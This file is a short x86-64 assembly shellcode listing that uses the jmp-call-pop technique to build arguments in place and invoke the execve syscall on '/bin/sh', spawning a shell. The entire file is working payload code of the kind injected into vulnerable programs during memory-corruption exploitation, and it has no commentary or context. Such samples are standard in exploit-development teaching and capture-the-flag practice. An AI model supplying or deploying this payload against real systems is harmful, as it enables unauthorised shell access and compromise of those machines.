global _start  
_start:  
    jmp DATA  
SHELLCODE:  
    xor rax, rax  
    pop rbx  
    mov [rbx+7], al  
    mov [rbx+8], rbx  
    mov [rbx+16], rax  
    push 59  
    pop rax  
    lea rdi, [rbx]  
    lea rsi, [rbx+8]  
    lea rdx, [rbx+16]  
    syscall  
DATA:  
    call SHELLCODE  
    shellpath: db "/bin/sh0aaaaaaaabbbbbbbb"  
segment .data  
